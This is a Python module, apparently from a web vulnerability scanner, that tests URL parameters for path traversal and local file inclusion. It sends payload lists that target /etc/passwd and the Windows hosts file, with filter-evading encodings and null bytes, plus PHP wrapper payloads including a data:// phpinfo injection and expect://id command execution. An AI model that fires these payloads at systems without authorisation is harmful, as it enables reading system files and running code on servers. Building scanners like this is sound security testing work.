"""Path Traversal Detection Module"""

class PathTraversalTester:
    def __init__(self):
        self.name = "Path Traversal Tester"
    
    def test_path_traversal(self, url):
        """Test for path traversal vulnerabilities"""
        import requests
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        vulnerabilities = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Path traversal payloads
        payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '/etc/passwd',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '..%252F..%252F..%252Fetc%252Fpasswd',
            '../../../etc/passwd%00.jpg',
            '....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts'
        ]
        
        # Indicators of successful traversal
        linux_indicators = ['root:x:', 'daemon:', '/bin/bash', '/bin/sh']
        windows_indicators = ['# Copyright', 'localhost', '127.0.0.1']
        
        for param in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, test_query, parsed.fragment))
                
                try:
                    response = requests.get(test_url, timeout=10)
                    
                    # Check for Linux /etc/passwd
                    if any(indicator in response.text for indicator in linux_indicators):
                        vulnerabilities.append({
                            'type': 'Path Traversal - Linux',
                            'severity': 'CRITICAL',
                            'description': f'Parameter {param} vulnerable to path traversal',
                            'evidence': f'Payload: {payload}, /etc/passwd accessible',
                            'url': test_url
                        })
                        break
                    
                    # Check for Windows hosts file
                    if any(indicator in response.text for indicator in windows_indicators) and 'etc' in payload.lower():
                        vulnerabilities.append({
                            'type': 'Path Traversal - Windows',
                            'severity': 'CRITICAL',
                            'description': f'Parameter {param} vulnerable to path traversal',
                            'evidence': f'Payload: {payload}, hosts file accessible',
                            'url': test_url
                        })
                        break
                
                except Exception:
                    pass
        
        return vulnerabilities
    
    def test_lfi(self, url):
        """Test for Local File Inclusion"""
        import requests
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        vulnerabilities = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # LFI payloads
        lfi_payloads = [
            'php://filter/convert.base64-encode/resource=index.php',
            'php://input',
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
            'expect://id',
            'file:///etc/passwd'
        ]
        
        for param in params:
            for payload in lfi_payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, test_query, parsed.fragment))
                
                try:
                    response = requests.get(test_url, timeout=10)
                    
                    # Check for PHP code or base64
                    if 'PD9waHA' in response.text or '<?php' in response.text:
                        vulnerabilities.append({
                            'type': 'Local File Inclusion (LFI)',
                            'severity': 'CRITICAL',
                            'description': f'Parameter {param} vulnerable to LFI',
                            'evidence': f'Payload: {payload}, PHP code accessible',
                            'url': test_url
                        })
                        break
                
                except Exception:
                    pass
        
        return vulnerabilities
